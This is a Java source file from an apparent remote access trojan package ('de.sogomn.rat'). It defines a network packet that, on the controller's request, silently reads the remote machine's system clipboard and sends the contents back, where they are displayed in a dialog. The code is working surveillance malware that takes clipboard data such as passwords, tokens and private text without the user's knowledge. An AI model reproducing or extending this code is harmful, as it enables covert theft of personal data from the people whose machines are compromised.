/*******************************************************************************
 * Copyright 2016 Johannes Boczek
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *******************************************************************************/

package de.sogomn.rat.packet;

import java.awt.HeadlessException;
import java.awt.Toolkit;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.UnsupportedFlavorException;
import java.io.IOException;

import javax.swing.JDialog;
import javax.swing.JOptionPane;

import de.sogomn.rat.ActiveConnection;

public final class ClipboardPacket extends AbstractPingPongPacket {
	
	private String clipboardContent;
	
	public ClipboardPacket() {
		type = REQUEST;
		clipboardContent = "";
	}
	
	@Override
	protected void sendRequest(final ActiveConnection connection) {
		//...
	}
	
	@Override
	protected void sendData(final ActiveConnection connection) {
		connection.writeUtf(clipboardContent);
	}
	
	@Override
	protected void receiveRequest(final ActiveConnection connection) {
		//...
	}
	
	@Override
	protected void receiveData(final ActiveConnection connection) {
		clipboardContent = connection.readUtf();
	}
	
	@Override
	protected void executeRequest(final ActiveConnection connection) {
		type = DATA;
		
		try {
			final Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
			final Object clipboardObject = clipboard.getData(DataFlavor.stringFlavor);
			
			if (clipboardObject != null) {
				clipboardContent = (String)clipboardObject;
			}
		} catch (final HeadlessException | UnsupportedFlavorException | IOException ex) {
			clipboardContent = "";
		}
		
		connection.addPacket(this);
	}
	
	@Override
	protected void executeData(final ActiveConnection connection) {
		final JOptionPane optionPane = new JOptionPane(clipboardContent);
		final JDialog dialog = optionPane.createDialog(null);
		
		dialog.setModal(false);
		dialog.setVisible(true);
	}
	
	public String getClipbordContent() {
		return clipboardContent;
	}
	
}
